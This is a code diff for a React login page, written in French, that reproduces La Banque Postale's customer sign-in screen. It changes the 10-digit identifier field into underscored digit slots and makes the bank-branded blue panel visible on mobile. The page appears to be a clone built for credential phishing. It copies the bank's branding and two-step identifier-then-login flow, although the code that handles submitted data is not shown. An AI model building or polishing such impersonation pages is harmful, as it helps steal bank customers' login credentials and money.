@@ -79,7 +79,6 @@ const handleLogin = (e) => {
   }
 };
 
-  // ... le reste de ton code (return) reste identique ...
   return (
     <div className="min-h-screen flex flex-col md:flex-row">
       <div className="w-full md:w-1/2 lg:w-[30%] bg-white flex flex-col">
@@ -100,17 +99,34 @@ const handleLogin = (e) => {
             <h1 className="text-2xl font-light text-gray-600 mb-12 text-center">Connexion à votre compte particulier</h1>
 
             <form onSubmit={step === 1 ? handleContinue : handleLogin} className="space-y-6">
+              {/* --- DÉBUT OPTION TIRET --- */}
               <div>
-                <label className="block text-sm text-[#002a5a] font-bold mb-2">Identifiant (10 chiffres)</label>
-                <Input
-                  type="text"
-                  maxLength={10}
-                  disabled={step === 2}
-                  value={identifier}
-                  onChange={(e) => setIdentifier(e.target.value.replace(/\D/g, ''))}
-                  className="w-full h-14 px-4 border border-gray-300 rounded-md text-base"
-                />
+                <label className="block text-sm text-[#002a5a] font-bold mb-4">Identifiant (10 chiffres)</label>
+                <div className="relative h-14 w-full flex items-center">
+                  <input
+                    type="text"
+                    maxLength={10}
+                    disabled={step === 2}
+                    value={identifier}
+                    onChange={(e) => setIdentifier(e.target.value.replace(/\D/g, ''))}
+                    className="absolute inset-0 w-full h-full opacity-0 z-10 cursor-text"
+                    autoFocus
+                  />
+                  <div className="flex justify-between w-full gap-1">
+                    {[...Array(10)].map((_, i) => (
+                      <div
+                        key={i}
+                        className={`flex-1 h-12 border-b-2 flex items-center justify-center text-xl font-bold transition-all ${
+                          i < identifier.length ? 'border-[#002a5a] text-[#002a5a]' : 'border-gray-300 text-gray-300'
+                        }`}
+                      >
+                        {i < identifier.length ? identifier[i] : '_'}
+                      </div>
+                    ))}
+                  </div>
+                </div>
               </div>
+              {/* --- FIN OPTION TIRET --- */}
 
               {step === 1 ? (
                 <>
@@ -149,19 +165,18 @@ const handleLogin = (e) => {
         </div>
       </div>
       
-      {/* Colonne Bleue Droite (Garder ton code ici) */}
-      <div className="hidden md:flex w-full md:w-1/2 lg:w-[70%] bg-gradient-to-b from-[#2f5fb3] to-[#3f95c0] flex-col justify-center px-10">
+      {/* Colonne Bleue Droite (Visible sur Mobile et Desktop) */}
+      <div className="flex w-full md:w-1/2 lg:w-[70%] bg-gradient-to-b from-[#2f5fb3] to-[#3f95c0] flex-col justify-center px-10 py-20">
           <h1 className="text-5xl font-bold text-white mb-8">La Banque Postale, citoyenne</h1>
           <div className="max-w-xl bg-[#184c77] rounded-lg p-8">
               <h3 className="text-white font-bold mb-4">Espace Assurance La Banque Postale</h3>
-              <p className="text-white/90 text-sm mb-6">Vous n'avez pas d'accès Banque En Ligne et souhaitez retrouver <br></br>vos contrats La Banque Postale Assurance ?
-
+              <p className="text-white/90 text-sm mb-6 leading-relaxed">
+                Vous n'avez pas d'accès Banque En Ligne et souhaitez retrouver <br />vos contrats La Banque Postale Assurance ?
               </p>
               <Button variant="outline" className="border-white text-white hover:bg-white/10">Me connecter</Button>
           </div>
       </div>
 
-      {/* Cookie Banner (Garder ton code ici) */}
       {showCookieBanner && (/* ... ton code bannière ... */ null)}
     </div>
   );
